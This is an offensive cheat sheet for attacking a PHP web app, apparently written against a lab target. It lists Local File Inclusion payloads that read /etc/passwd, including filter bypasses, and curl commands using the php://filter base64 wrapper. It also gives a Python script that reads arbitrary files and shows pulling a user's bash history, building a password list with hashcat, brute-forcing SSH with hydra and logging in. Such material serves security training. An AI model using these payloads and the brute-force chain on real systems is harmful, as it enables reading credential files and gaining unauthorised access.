This is a Cheet Sheet for Web App Attack

# Local File Inclusion

- http://10.10.143.24/index.php?page=../../../etc/passwd
- http://10.10.143.24/index.php?page=home.html../../../etc/passwd
- http://10.10.143.24/index.php?page=....//....//....//etc/passwd

### PHP wrappers
we can use PHP wrappers, also known as PHP stream wrappers


**php://filter/convert.base64-encode/resource=FILE_PATH**              #we can get the content of a file encoded in base64 using this payload

```
curl http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
curl http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd | base64 -d
```

### python script to automate this LFI

```
import requests
import base64

while True :
    file = input("[+]File => ")
    response = requests.get(f'http://10.10.143.24/index.php?page=php://filter/convert.base64-encode/resource={file}')
    decoded = base64.b64decode(response.text)
    print(decoded.decode('utf-8'))
```

**Output**
```

└─$ python3 LFI.py

[+]File => /etc/passwd

[+]File => /home/blue/.bash_history

[+]File => /home/blue/.reminder
[REDACTED]

#In Attacker Machine
└─$ echo '[REDACTED]' > password.txt

└─$ hashcat --stdout password.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

### Hydra
```
└─$ hydra -l blue -P passlist.txt  ssh://10.10.143.24
```

### SSH
```
└─$ ssh blue@10.10.143.24
```


